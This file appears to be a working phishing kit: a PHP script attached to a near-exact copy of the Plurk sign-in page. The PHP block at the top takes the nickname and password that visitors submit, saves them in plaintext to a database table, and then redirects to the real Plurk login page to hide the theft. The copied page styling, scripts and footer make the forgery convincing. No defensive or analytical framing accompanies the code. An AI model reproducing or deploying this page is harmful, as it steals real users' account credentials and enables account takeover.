<?php
// 1. SETUP & CONNECTION
// Load database connection info from environment variables
$host = getenv('DB_HOST');
$port = getenv('DB_PORT') ?: 5432;
$dbname = getenv('DB_NAME');
$user = getenv('DB_USER');
$pass = getenv('DB_PASS');

try {
  // Connect to PostgreSQL
  $dsn = "pgsql:host=$host;port=$port;dbname=$dbname";
  $pdo = new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);

  // 2. HANDLE FORM SUBMISSION
  if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Get values using the correct names
    $nickname = $_POST['nickname'] ?? '';
    $password_input = $_POST['password'] ?? '';

    if (!empty($nickname) && !empty($password_input)) {
      // Insert into database
      $stmt = $pdo->prepare("INSERT INTO plurkinfo (nickname, password_input) VALUES (:nickname, :password_input)");
      $stmt->execute([
        ':nickname' => $nickname,
        ':password_input' => $password_input
      ]);

      // Redirect after saving
      header("Location: https://www.plurk.com/login?r=");
      exit;
    }
  }
} catch (PDOException $e) {
  // For testing, print the error so we know if connection fails
  echo "Database Error: " . $e->getMessage();
}
?>

<html lang="en">

<head>
  <style type="text/css">
    .swal-icon--error {
      border-color: #f27474;
      -webkit-animation: animateErrorIcon 0.5s;
      animation: animateErrorIcon 0.5s;
    }

    .swal-icon--error__x-mark {
      position: relative;
      display: block;
      -webkit-animation: animateXMark 0.5s;
      animation: animateXMark 0.5s;
    }

    .swal-icon--error__line {
      position: absolute;
      height: 5px;
      width: 47px;
      background-color: #f27474;
      display: block;
      top: 37px;
      border-radius: 2px;
    }

    .swal-icon--error__line--left {
      -webkit-transform: rotate(45deg);
      transform: rotate(45deg);
      left: 17px;
    }

    .swal-icon--error__line--right {
      -webkit-transform: rotate(-45deg);
      transform: rotate(-45deg);
      right: 16px;
    }

    @-webkit-keyframes animateErrorIcon {
      0% {
        -webkit-transform: rotateX(100deg);
        transform: rotateX(100deg);
        opacity: 0;
      }

      to {
        -webkit-transform: rotateX(0deg);
        transform: rotateX(0deg);
        opacity: 1;
      }
    }

    @keyframes animateErrorIcon {
      0% {
        -webkit-transform: rotateX(100deg);
        transform: rotateX(100deg);
        opacity: 0;
      }

      to {
        -webkit-transform: rotateX(0deg);
        transform: rotateX(0deg);
        opacity: 1;
      }
    }

    @-webkit-keyframes animateXMark {
      0% {
        -webkit-transform: scale(0.4);
        transform: scale(0.4);
        margin-top: 26px;
        opacity: 0;
      }

      50% {
        -webkit-transform: scale(0.4);
        transform: scale(0.4);
        margin-top: 26px;
        opacity: 0;
      }

      80% {
        -webkit-transform: scale(1.15);
        transform: scale(1.15);
        margin-top: -6px;
      }

      to {
        -webkit-transform: scale(1);
        transform: scale(1);
        margin-top: 0;
        opacity: 1;
      }
    }

    @keyframes animateXMark {
      0% {
        -webkit-transform: scale(0.4);
        transform: scale(0.4);
        margin-top: 26px;
        opacity: 0;
      }

      50% {
        -webkit-transform: scale(0.4);
        transform: scale(0.4);
        margin-top: 26px;
        opacity: 0;
      }

      80% {
        -webkit-transform: scale(1.15);
        transform: scale(1.15);
        margin-top: -6px;
      }

      to {
        -webkit-transform: scale(1);
        transform: scale(1);
        margin-top: 0;
        opacity: 1;
      }
    }

    .swal-icon--warning {
      border-color: #f8bb86;
      -webkit-animation: pulseWarning 0.75s infinite alternate;
      animation: pulseWarning 0.75s infinite alternate;
    }

    .swal-icon--warning__body {
      width: 5px;
      height: 47px;
      top: 10px;
      border-radius: 2px;
      margin-left: -2px;
    }

    .swal-icon--warning__body,
    .swal-icon--warning__dot {
      position: absolute;
      left: 50%;
      background-color: #f8bb86;
    }

    .swal-icon--warning__dot {
      width: 7px;
      height: 7px;
      border-radius: 50%;
      margin-left: -4px;
      bottom: -11px;
    }

    @-webkit-keyframes pulseWarning {
      0% {
        border-color: #f8d486;
      }

      to {
        border-color: #f8bb86;
      }
    }

    @keyframes pulseWarning {
      0% {
        border-color: #f8d486;
      }

      to {
        border-color: #f8bb86;
      }
    }

    .swal-icon--success {
      border-color: #a5dc86;
    }

    .swal-icon--success:after,
    .swal-icon--success:before {
      content: "";
      border-radius: 50%;
      position: absolute;
      width: 60px;
      height: 120px;
      background: #fff;
      -webkit-transform: rotate(45deg);
      transform: rotate(45deg);
    }

    .swal-icon--success:before {
      border-radius: 120px 0 0 120px;
      top: -7px;
      left: -33px;
      -webkit-transform: rotate(-45deg);
      transform: rotate(-45deg);
      -webkit-transform-origin: 60px 60px;
      transform-origin: 60px 60px;
    }

    .swal-icon--success:after {
      border-radius: 0 120px 120px 0;
      top: -11px;
      left: 30px;
      -webkit-transform: rotate(-45deg);
      transform: rotate(-45deg);
      -webkit-transform-origin: 0 60px;
      transform-origin: 0 60px;
      -webkit-animation: rotatePlaceholder 4.25s ease-in;
      animation: rotatePlaceholder 4.25s ease-in;
    }

    .swal-icon--success__ring {
      width: 80px;
      height: 80px;
      border: 4px solid hsla(98, 55%, 69%, 0.2);
      border-radius: 50%;
      box-sizing: content-box;
      position: absolute;
      left: -4px;
      top: -4px;
      z-index: 2;
    }

    .swal-icon--success__hide-corners {
      width: 5px;
      height: 90px;
      background-color: #fff;
      padding: 1px;
      position: absolute;
      left: 28px;
      top: 8px;
      z-index: 1;
      -webkit-transform: rotate(-45deg);
      transform: rotate(-45deg);
    }

    .swal-icon--success__line {
      height: 5px;
      background-color: #a5dc86;
      display: block;
      border-radius: 2px;
      position: absolute;
      z-index: 2;
    }

    .swal-icon--success__line--tip {
      width: 25px;
      left: 14px;
      top: 46px;
      -webkit-transform: rotate(45deg);
      transform: rotate(45deg);
      -webkit-animation: animateSuccessTip 0.75s;
      animation: animateSuccessTip 0.75s;
    }

    .swal-icon--success__line--long {
      width: 47px;
      right: 8px;
      top: 38px;
      -webkit-transform: rotate(-45deg);
      transform: rotate(-45deg);
      -webkit-animation: animateSuccessLong 0.75s;
      animation: animateSuccessLong 0.75s;
    }

    @-webkit-keyframes rotatePlaceholder {
      0% {
        -webkit-transform: rotate(-45deg);
        transform: rotate(-45deg);
      }

      5% {
        -webkit-transform: rotate(-45deg);
        transform: rotate(-45deg);
      }

      12% {
        -webkit-transform: rotate(-405deg);
        transform: rotate(-405deg);
      }

      to {
        -webkit-transform: rotate(-405deg);
        transform: rotate(-405deg);
      }
    }

    @keyframes rotatePlaceholder {
      0% {
        -webkit-transform: rotate(-45deg);
        transform: rotate(-45deg);
      }

      5% {
        -webkit-transform: rotate(-45deg);
        transform: rotate(-45deg);
      }

      12% {
        -webkit-transform: rotate(-405deg);
        transform: rotate(-405deg);
      }

      to {
        -webkit-transform: rotate(-405deg);
        transform: rotate(-405deg);
      }
    }

    @-webkit-keyframes animateSuccessTip {
      0% {
        width: 0;
        left: 1px;
        top: 19px;
      }

      54% {
        width: 0;
        left: 1px;
        top: 19px;
      }

      70% {
        width: 50px;
        left: -8px;
        top: 37px;
      }

      84% {
        width: 17px;
        left: 21px;
        top: 48px;
      }

      to {
        width: 25px;
        left: 14px;
        top: 45px;
      }
    }

    @keyframes animateSuccessTip {
      0% {
        width: 0;
        left: 1px;
        top: 19px;
      }

      54% {
        width: 0;
        left: 1px;
        top: 19px;
      }

      70% {
        width: 50px;
        left: -8px;
        top: 37px;
      }

      84% {
        width: 17px;
        left: 21px;
        top: 48px;
      }

      to {
        width: 25px;
        left: 14px;
        top: 45px;
      }
    }

    @-webkit-keyframes animateSuccessLong {
      0% {
        width: 0;
        right: 46px;
        top: 54px;
      }

      65% {
        width: 0;
        right: 46px;
        top: 54px;
      }

      84% {
        width: 55px;
        right: 0;
        top: 35px;
      }

      to {
        width: 47px;
        right: 8px;
        top: 38px;
      }
    }

    @keyframes animateSuccessLong {
      0% {
        width: 0;
        right: 46px;
        top: 54px;
      }

      65% {
        width: 0;
        right: 46px;
        top: 54px;
      }

      84% {
        width: 55px;
        right: 0;
        top: 35px;
      }

      to {
        width: 47px;
        right: 8px;
        top: 38px;
      }
    }

    .swal-icon--info {
      border-color: #c9dae1;
    }

    .swal-icon--info:before {
      width: 5px;
      height: 29px;
      bottom: 17px;
      border-radius: 2px;
      margin-left: -2px;
    }

    .swal-icon--info:after,
    .swal-icon--info:before {
      content: "";
      position: absolute;
      left: 50%;
      background-color: #c9dae1;
    }

    .swal-icon--info:after {
      width: 7px;
      height: 7px;
      border-radius: 50%;
      margin-left: -3px;
      top: 19px;
    }

    .swal-icon {
      width: 80px;
      height: 80px;
      border-width: 4px;
      border-style: solid;
      border-radius: 50%;
      padding: 0;
      position: relative;
      box-sizing: content-box;
      margin: 20px auto;
    }

    .swal-icon:first-child {
      margin-top: 32px;
    }

    .swal-icon--custom {
      width: auto;
      height: auto;
      max-width: 100%;
      border: none;
      border-radius: 0;
    }

    .swal-icon img {
      max-width: 100%;
      max-height: 100%;
    }

    .swal-title {
      color: rgba(0, 0, 0, 0.65);
      font-weight: 600;
      text-transform: none;
      position: relative;
      display: block;
      padding: 13px 16px;
      font-size: 27px;
      line-height: normal;
      text-align: center;
      margin-bottom: 0;
    }

    .swal-title:first-child {
      margin-top: 26px;
    }

    .swal-title:not(:first-child) {
      padding-bottom: 0;
    }

    .swal-title:not(:last-child) {
      margin-bottom: 13px;
    }

    .swal-text {
      font-size: 16px;
      position: relative;
      float: none;
      line-height: normal;
      vertical-align: top;
      text-align: left;
      display: inline-block;
      margin: 0;
      padding: 0 10px;
      font-weight: 400;
      color: rgba(0, 0, 0, 0.64);
      max-width: calc(100% - 20px);
      overflow-wrap: break-word;
      box-sizing: border-box;
    }

    .swal-text:first-child {
      margin-top: 45px;
    }

    .swal-text:last-child {
      margin-bottom: 45px;
    }

    .swal-footer {
      text-align: right;
      padding-top: 13px;
      margin-top: 13px;
      padding: 13px 16px;
      border-radius: inherit;
      border-top-left-radius: 0;
      border-top-right-radius: 0;
    }

    .swal-button-container {
      margin: 5px;
      display: inline-block;
      position: relative;
    }

    .swal-button {
      background-color: #7cd1f9;
      color: #fff;
      border: none;
      box-shadow: none;
      border-radius: 5px;
      font-weight: 600;
      font-size: 14px;
      padding: 10px 24px;
      margin: 0;
      cursor: pointer;
    }

    .swal-button:not([disabled]):hover {
      background-color: #78cbf2;
    }

    .swal-button:active {
      background-color: #70bce0;
    }

    .swal-button:focus {
      outline: none;
      box-shadow: 0 0 0 1px #fff, 0 0 0 3px rgba(43, 114, 165, 0.29);
    }

    .swal-button[disabled] {
      opacity: 0.5;
      cursor: default;
    }

    .swal-button::-moz-focus-inner {
      border: 0;
    }

    .swal-button--cancel {
      color: #555;
      background-color: #efefef;
    }

    .swal-button--cancel:not([disabled]):hover {
      background-color: #e8e8e8;
    }

    .swal-button--cancel:active {
      background-color: #d7d7d7;
    }

    .swal-button--cancel:focus {
      box-shadow: 0 0 0 1px #fff, 0 0 0 3px rgba(116, 136, 150, 0.29);
    }

    .swal-button--danger {
      background-color: #e64942;
    }

    .swal-button--danger:not([disabled]):hover {
      background-color: #df4740;
    }

    .swal-button--danger:active {
      background-color: #cf423b;
    }

    .swal-button--danger:focus {
      box-shadow: 0 0 0 1px #fff, 0 0 0 3px rgba(165, 43, 43, 0.29);
    }

    .swal-content {
      padding: 0 20px;
      margin-top: 20px;
      font-size: medium;
    }

    .swal-content:last-child {
      margin-bottom: 20px;
    }

    .swal-content__input,
    .swal-content__textarea {
      -webkit-appearance: none;
      background-color: #fff;
      border: none;
      font-size: 14px;
      display: block;
      box-sizing: border-box;
      width: 100%;
      border: 1px solid rgba(0, 0, 0, 0.14);
      padding: 10px 13px;
      border-radius: 2px;
      transition: border-color 0.2s;
    }

    .swal-content__input:focus,
    .swal-content__textarea:focus {
      outline: none;
      border-color: #6db8ff;
    }

    .swal-content__textarea {
      resize: vertical;
    }

    .swal-button--loading {
      color: transparent;
    }

    .swal-button--loading~.swal-button__loader {
      opacity: 1;
    }

    .swal-button__loader {
      position: absolute;
      height: auto;
      width: 43px;
      z-index: 2;
      left: 50%;
      top: 50%;
      -webkit-transform: translateX(-50%) translateY(-50%);
      transform: translateX(-50%) translateY(-50%);
      text-align: center;
      pointer-events: none;
      opacity: 0;
    }

    .swal-button__loader div {
      display: inline-block;
      float: none;
      vertical-align: baseline;
      width: 9px;
      height: 9px;
      padding: 0;
      border: none;
      margin: 2px;
      opacity: 0.4;
      border-radius: 7px;
      background-color: hsla(0, 0%, 100%, 0.9);
      transition: background 0.2s;
      -webkit-animation: swal-loading-anim 1s infinite;
      animation: swal-loading-anim 1s infinite;
    }

    .swal-button__loader div:nth-child(3n + 2) {
      -webkit-animation-delay: 0.15s;
      animation-delay: 0.15s;
    }

    .swal-button__loader div:nth-child(3n + 3) {
      -webkit-animation-delay: 0.3s;
      animation-delay: 0.3s;
    }

    @-webkit-keyframes swal-loading-anim {
      0% {
        opacity: 0.4;
      }

      20% {
        opacity: 0.4;
      }

      50% {
        opacity: 1;
      }

      to {
        opacity: 0.4;
      }
    }

    @keyframes swal-loading-anim {
      0% {
        opacity: 0.4;
      }

      20% {
        opacity: 0.4;
      }

      50% {
        opacity: 1;
      }

      to {
        opacity: 0.4;
      }
    }

    .swal-overlay {
      position: fixed;
      top: 0;
      bottom: 0;
      left: 0;
      right: 0;
      text-align: center;
      font-size: 0;
      overflow-y: auto;
      background-color: rgba(0, 0, 0, 0.4);
      z-index: 10000;
      pointer-events: none;
      opacity: 0;
      transition: opacity 0.3s;
    }

    .swal-overlay:before {
      content: " ";
      display: inline-block;
      vertical-align: middle;
      height: 100%;
    }

    .swal-overlay--show-modal {
      opacity: 1;
      pointer-events: auto;
    }

    .swal-overlay--show-modal .swal-modal {
      opacity: 1;
      pointer-events: auto;
      box-sizing: border-box;
      -webkit-animation: showSweetAlert 0.3s;
      animation: showSweetAlert 0.3s;
      will-change: transform;
    }

    .swal-modal {
      width: 478px;
      opacity: 0;
      pointer-events: none;
      background-color: #fff;
      text-align: center;
      border-radius: 5px;
      position: static;
      margin: 20px auto;
      display: inline-block;
      vertical-align: middle;
      -webkit-transform: scale(1);
      transform: scale(1);
      -webkit-transform-origin: 50% 50%;
      transform-origin: 50% 50%;
      z-index: 10001;
      transition: opacity 0.2s, -webkit-transform 0.3s;
      transition: transform 0.3s, opacity 0.2s;
      transition: transform 0.3s, opacity 0.2s, -webkit-transform 0.3s;
    }

    @media (max-width: 500px) {
      .swal-modal {
        width: calc(100% - 20px);
      }
    }

    @-webkit-keyframes showSweetAlert {
      0% {
        -webkit-transform: scale(1);
        transform: scale(1);
      }

      1% {
        -webkit-transform: scale(0.5);
        transform: scale(0.5);
      }

      45% {
        -webkit-transform: scale(1.05);
        transform: scale(1.05);
      }

      80% {
        -webkit-transform: scale(0.95);
        transform: scale(0.95);
      }

      to {
        -webkit-transform: scale(1);
        transform: scale(1);
      }
    }

    @keyframes showSweetAlert {
      0% {
        -webkit-transform: scale(1);
        transform: scale(1);
      }

      1% {
        -webkit-transform: scale(0.5);
        transform: scale(0.5);
      }

      45% {
        -webkit-transform: scale(1.05);
        transform: scale(1.05);
      }

      80% {
        -webkit-transform: scale(0.95);
        transform: scale(0.95);
      }

      to {
        -webkit-transform: scale(1);
        transform: scale(1);
      }
    }
  </style>
  <meta charset="utf-8" />
  <title>Plurk sign in - Plurk</title>
  <link rel="dns-prefetch" href="//avatars.plurk.com" />
  <link rel="dns-prefetch" href="//emos.plurk.com" />
  <link rel="dns-prefetch" href="//images.plurk.com" />
  <link rel="dns-prefetch" href="//imgs.plurk.com" />
  <link rel="dns-prefetch" href="//s.plurk.com" />
  <link rel="dns-prefetch" href="//cdnjs.cloudflare.com" />
  <link rel="preconnect" href="https://s.plurk.com" />
  <link rel="icon" type="image/png" href="https://play-lh.googleusercontent.com/U_5xg82-GrbN5OvoHtm87O1Vk-Z2SKk8liWBnxcy9EppQNZ3BlsHhTXekqwEMXNaz7Y=w240-h480-rw" />
  <link rel="apple-touch-icon" size="180x180" type="image/png" href="/apple-touch-icon.png" />
  <link rel="manifest" href="/manifest.webmanifest" />
  <meta name="application-name" content="Plurk" />
  <meta name="msapplication-TileColor" content="#AA460F" />
  <meta name="msapplication-TileImage" content="https://s.plurk.com/5a2bce3cc2270c8287f7.png" />
  <meta property="og:type" content="website" />
  <meta property="og:title" content="Plurk sign in - Plurk" />
  <meta property="og:image" content="https://s.plurk.com/2c1574c02566f3b06e91.png" />
  <meta property="fb:app_id" content="47804741521" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
  <meta name="verify-v1" content="iBRwaQ/3d4NoF1uaa2SAfCJ962ORry1TE8/4XxtIbHk=" />
  <meta name="viewport" content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0, width=device-width" />
  <script type="text/javascript" src="https://s.plurk.com/1391c7d2b08cb7885b48.js"></script>
  <script type="text/javascript" src="https://s.plurk.com/cd016859680c9a676a92.js"></script>
  <script type="text/javascript" src="https://s.plurk.com/df8ad868ef05e65d0132.js"></script>
  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js" integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg==" crossorigin="anonymous"></script>
  <script>
    window.jQuery || document.write('<script  type="text/javascript" src="https://s.plurk.com/jquery-3.3.1.min.js" integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg==" crossorigin="anonymous">\x3C/script>');
  </script>
  <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.2.0/css/font-awesome.min.css" integrity="sha512-ZfKn7az0YmtPUojZnRXO4CUdt3pn+ogBAyGbqGplrCIR5B/tQwPGtF2q29t+zQj6mC/20w4sSl0cF5F3r0HKSQ==" crossorigin="anonymous" />
  <link rel="stylesheet" type="text/css" href="https://s.plurk.com/b4da066b025bcc7ecd4f.css" />
  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.2/sweetalert.min.js" integrity="sha512-AA1Bzp5Q0K1KanKKmvN/4d3IRKVlv9PYgwFPvm32nPO6QS8yH1HO7LbgB1pgiOxPtfeg5zEn2ba64MUcqJx6CA==" crossorigin="anonymous"></script>
  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/handlebars.js/1.3.0/handlebars.min.js" integrity="sha512-M6+BzVc9Kx1Nc9C1WLtDPh852QE/HwTQqL/ntzpzCIF5ZmObBX2/zmPxjFzyiw1izK+xFqJsl/ckoWtTgIrBRg==" crossorigin="anonymous"></script>
  <!--[if lt IE 9]> <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.6.2/html5shiv.js"></script> <![endif]-->
  <script type="text/javascript" src="https://s.plurk.com/621a5cbd66c1ad116e38.js" integrity="sha512-ew99Uy1lft5FQp3IBmWlL0KnYlz5Via2iSvzDSzzSZ0oqYwsX30YF9qkrXyuxvNYRCIh7vVYUgQZQtXi1EVPhw==" crossorigin="anonymous"></script>
  <style>
    #buorg .buorg-icon {
      background-image: none;
    }

    #buorg #buorgul,
    #buorg #buorgig,
    #buorg #buorgpermanent {
      border-radius: 999px;
      font-size: 15px;
      padding: 11px 16px;
      line-height: 1;
      font-weight: bold;
      box-shadow: none;
    }

    #buorg #buorgul {
      background: #0a9c17;
    }

    #buorg #buorgig {
      background-color: transparent;
      box-shadow: inset 0 0 0 1px #ff574d;
      color: #ff574d;
    }

    #buorg #buorgig:hover,
    #buorg #buorgig:focus,
    #buorg #buorgig:active {
      color: #ff675d;
      box-shadow: inset 0 0 0 1px #ff675d;
    }

    #buorg #buorgpermanent {
      background: #e8af37;
    }
  </style>
  <style>
    .browser-update-dialog {
      width: 100%;
      display: table;
      table-layout: fixed;
      border-collapse: collapse;
    }

    .browser-update-dialog.inactive {
      position: absolute;
      top: -99999px;
      opacity: 0.01;
    }

    .browser-update-dialog>.browser-candidate {
      display: table-cell;
      padding: 0 4px;
    }

    .browser-update-dialog .browser-image {
      display: block;
      margin: 8px auto;
      width: 100%;
    }

    .browser-update-dialog .browser-link {
      display: block;
      border-radius: 12px;
      padding: 8px;
      border: 1px solid transparent;
    }

    .browser-update-dialog .browser-link:hover {
      border-color: #ff574d;
    }

    @media screen and (max-width: 640px) {
      .browser-update-dialog {
        display: block;
      }

      .browser-update-dialog>.browser-candidate {
        display: inline-block;
        width: 30vw;
      }
    }
  </style>
  <!-- Google tag (gtag.js) -->
  <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-15X0DLSVWS"></script>
  <script>
    window.dataLayer = window.dataLayer || [];

    function gtag() {
      dataLayer.push(arguments);
    }
    gtag("js", new Date());

    gtag("config", "G-15X0DLSVWS", {});
  </script>

  <script>
    /*<![CDATA[*/
    function $static_path(path) {
      return "//assets.plurk.com" + path;
    }

    function $theme_path(path) {
      return "//assets.plurk.com/static/theme/v5/" + path;
    }

    window.LANG = "en";

    var GLOBAL = {
      session_user: null,
      page_user: null,
    };
    /*]]>*/
  </script>

  <script type="text/javascript" src="https://s.plurk.com/bd48868da10e5d4fa24b.js"></script>
  <script type="text/javascript" src="https://s.plurk.com/1391c7d2b08cb7885b48.js"></script>
  <script type="text/javascript" src="https://s.plurk.com/cd016859680c9a676a92.js"></script>
  <script type="text/javascript" src="https://s.plurk.com/321d2f448abfab18b46f.js"></script>
  <link rel="stylesheet" type="text/css" href="https://s.plurk.com/5200ac9c09e47cd2a2c9.css" />
  <link rel="stylesheet" type="text/css" href="https://s.plurk.com/83039b5dd24f086a0547.css" />
  <script type="text/javascript" src="https://s.plurk.com/1391c7d2b08cb7885b48.js"></script>
  <script type="text/javascript" src="https://s.plurk.com/9a5fab0f605e484dd773.js"></script>
  <link rel="stylesheet" type="text/css" href="https://s.plurk.com/0b4c6bba169d05713bfa.css" />
  <style>
    .rdp {
      --rdp-cell-size: 40px;
      --rdp-accent-color: #0000ff;
      --rdp-background-color: #e7edff;
      --rdp-accent-color-dark: #3003e1;
      --rdp-background-color-dark: #180270;
      --rdp-outline: 2px solid var(--rdp-accent-color);
      /* Outline border for focused elements */
      --rdp-outline-selected: 2px solid rgba(0, 0, 0, 0.75);
      /* Outline border for focused _and_ selected elements */

      margin: 1em;
    }

    /* Hide elements for devices that are not screen readers */
    .rdp-vhidden {
      box-sizing: border-box;
      padding: 0;
      margin: 0;
      background: transparent;
      border: 0;
      -moz-appearance: none;
      -webkit-appearance: none;
      appearance: none;
      position: absolute !important;
      top: 0;
      width: 1px !important;
      height: 1px !important;
      padding: 0 !important;
      overflow: hidden !important;
      clip: rect(1px, 1px, 1px, 1px) !important;
      border: 0 !important;
    }

    /* Buttons */
    .rdp-button_reset {
      appearance: none;
      position: relative;
      margin: 0;
      padding: 0;
      cursor: default;
      color: inherit;
      outline: none;
      background: none;
      font: inherit;

      -moz-appearance: none;
      -webkit-appearance: none;
    }

    .rdp-button {
      border: 2px solid transparent;
    }

    .rdp-button[disabled] {
      opacity: 0.25;
    }

    .rdp-button:not([disabled]) {
      cursor: pointer;
    }

    .rdp-button:focus:not([disabled]),
    .rdp-button:active:not([disabled]) {
      color: inherit;
      border: var(--rdp-outline);
      background-color: var(--rdp-background-color);
    }

    .rdp-button:hover:not([disabled]) {
      background-color: var(--rdp-background-color);
    }

    .rdp-months {
      display: flex;
    }

    .rdp-month {
      margin: 0 1em;
    }

    .rdp-month:first-child {
      margin-left: 0;
    }

    .rdp-month:last-child {
      margin-right: 0;
    }

    .rdp-table {
      margin: 0;
      max-width: calc(var(--rdp-cell-size) * 7);
      border-collapse: collapse;
    }

    .rdp-with_weeknumber .rdp-table {
      max-width: calc(var(--rdp-cell-size) * 8);
      border-collapse: collapse;
    }

    .rdp-caption {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0;
      text-align: left;
    }

    .rdp-multiple_months .rdp-caption {
      position: relative;
      display: block;
      text-align: center;
    }

    .rdp-caption_dropdowns {
      position: relative;
      display: inline-flex;
    }

    .rdp-caption_label {
      position: relative;
      z-index: 1;
      display: inline-flex;
      align-items: center;
      margin: 0;
      padding: 0 0.25em;
      white-space: nowrap;
      color: currentColor;
      border: 0;
      border: 2px solid transparent;
      font-family: inherit;
      font-size: 140%;
      font-weight: bold;
    }

    .rdp-nav {
      white-space: nowrap;
    }

    .rdp-multiple_months .rdp-caption_start .rdp-nav {
      position: absolute;
      top: 50%;
      left: 0;
      transform: translateY(-50%);
    }

    .rdp-multiple_months .rdp-caption_end .rdp-nav {
      position: absolute;
      top: 50%;
      right: 0;
      transform: translateY(-50%);
    }

    .rdp-nav_button {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      width: var(--rdp-cell-size);
      height: var(--rdp-cell-size);
      padding: 0.25em;
      border-radius: 100%;
    }

    /* ---------- */
    /* Dropdowns  */
    /* ---------- */

    .rdp-dropdown_year,
    .rdp-dropdown_month {
      position: relative;
      display: inline-flex;
      align-items: center;
    }

    .rdp-dropdown {
      appearance: none;
      position: absolute;
      z-index: 2;
      top: 0;
      bottom: 0;
      left: 0;
      width: 100%;
      margin: 0;
      padding: 0;
      cursor: inherit;
      opacity: 0;
      border: none;
      background-color: transparent;
      font-family: inherit;
      font-size: inherit;
      line-height: inherit;
    }

    .rdp-dropdown[disabled] {
      opacity: unset;
      color: unset;
    }

    .rdp-dropdown:focus:not([disabled])+.rdp-caption_label,
    .rdp-dropdown:active:not([disabled])+.rdp-caption_label {
      border: var(--rdp-outline);
      border-radius: 6px;
      background-color: var(--rdp-background-color);
    }

    .rdp-dropdown_icon {
      margin: 0 0 0 5px;
    }

    .rdp-head {
      border: 0;
    }

    .rdp-head_row,
    .rdp-row {
      height: 100%;
    }

    .rdp-head_cell {
      vertical-align: middle;
      text-transform: uppercase;
      font-size: 0.75em;
      font-weight: 700;
      text-align: center;
      height: 100%;
      height: var(--rdp-cell-size);
      padding: 0;
    }

    .rdp-tbody {
      border: 0;
    }

    .rdp-tfoot {
      margin: 0.5em;
    }

    .rdp-cell {
      width: var(--rdp-cell-size);
      height: 100%;
      height: var(--rdp-cell-size);
      padding: 0;
      text-align: center;
    }

    .rdp-weeknumber {
      font-size: 0.75em;
    }

    .rdp-weeknumber,
    .rdp-day {
      display: flex;
      overflow: hidden;
      align-items: center;
      justify-content: center;
      box-sizing: border-box;
      width: var(--rdp-cell-size);
      max-width: var(--rdp-cell-size);
      height: var(--rdp-cell-size);
      margin: 0;
      border: 2px solid transparent;
      border-radius: 100%;
    }

    .rdp-day_today:not(.rdp-day_outside) {
      font-weight: bold;
    }

    .rdp-day_selected:not([disabled]),
    .rdp-day_selected:focus:not([disabled]),
    .rdp-day_selected:active:not([disabled]),
    .rdp-day_selected:hover:not([disabled]) {
      color: white;
      background-color: var(--rdp-accent-color);
    }

    .rdp-day_selected:focus:not([disabled]) {
      border: var(--rdp-outline-selected);
    }

    .rdp:not([dir="rtl"]) .rdp-day_range_start:not(.rdp-day_range_end) {
      border-top-right-radius: 0;
      border-bottom-right-radius: 0;
    }

    .rdp:not([dir="rtl"]) .rdp-day_range_end:not(.rdp-day_range_start) {
      border-top-left-radius: 0;
      border-bottom-left-radius: 0;
    }

    .rdp[dir="rtl"] .rdp-day_range_start:not(.rdp-day_range_end) {
      border-top-left-radius: 0;
      border-bottom-left-radius: 0;
    }

    .rdp[dir="rtl"] .rdp-day_range_end:not(.rdp-day_range_start) {
      border-top-right-radius: 0;
      border-bottom-right-radius: 0;
    }

    .rdp-day_range_end.rdp-day_range_start {
      border-radius: 100%;
    }

    .rdp-day_range_middle {
      border-radius: 0;
    }
  </style>
</head>

<body class="html5 nologin" cz-shortcut-listen="true">
  <div class="bg-logo pif-plurklogo"></div>
  <div id="top_bar" class="clearfix">
    <div id="top-bar-main">
      <ul class="item-container">
        <li id="navbar-portal" class="item tab portal">
          <a href="/portal"><i class="bar-icon pif-topplurk"></i></a>
        </li>
      </ul>
    </div>
    <div id="top-bar-user">
      <ul class="item-container">
        <li id="navbar-register" class="item item-reversed item-round"><a href="/signup" id="bar-register">Register</a></li>
      </ul>
    </div>
  </div>
  <div class="content-holder">
    <script>
      window.error = false;
      window.help_text = false;
      window.nick_name = null;
      window.register_overlay = false;
      window.register_mobile = false;

      $(document).ready(initLogin);
    </script>
    <div class="login-holder clearfix">
      <div class="logo pif-plurk"></div>

      <!-- main form handling -->
      <form action="index.php" method="post" id="login_form" class="overlay-form">
        <div class="input-holder">
          <div id="nick_name">
            <input type="text" id="input_nick_name" name="nickname" placeholder="Nickname" value="" spellcheck="false" autocomplete="username" />
          </div>

          <div id="password">
            <input type="password" id="input_password" name="password" placeholder="Password" autocomplete="current-password" />
          </div>
        </div>

        <div id="reset_password"><a href="/resetPassword">Forgot your password?</a></div>
        <button type="submit" id="login_submit" class="submit">Login</button>

        <div id="term">
          <p>Your login will be remembered for 14 days (or until logout).</p>
        </div>
        <input type="hidden" name="login_token" value="$1$0a3cbba18e06ab1a02d2bc8f208f7a9c67dd4c7950ef62eb0f54ef9baa80bf66@t5plqu" />
      </form>
    </div>
    <footer class="clearfix">
      <div id="footer">
        <ul>
          <li class="copyright clearfix">
            © 2008-<span id="footer-year">
              <script>
                document.write(new Date().getFullYear());
              </script>
              <span> Plurk</span>
            </span>
          </li>
          <li><a href="/aboutUs">About</a></li>
          <li><a href="/brandInfo">Brand Assets</a></li>
          <li><a href="/Verify/" target="_blank">Verified Account</a></li>
          <li><a href="/terms">Terms</a></li>
          <li><a href="/privacy">Privacy</a></li>
          <li><a href="/content-policy">Content Policy</a></li>
          <li><a href="/help">FAQ</a></li>
          <li><a href="/contact">Contact Us</a></li>
        </ul>
        <div id="languge_selector">
          <i class="pif-earth"></i>
          <i style="display: inline-block">
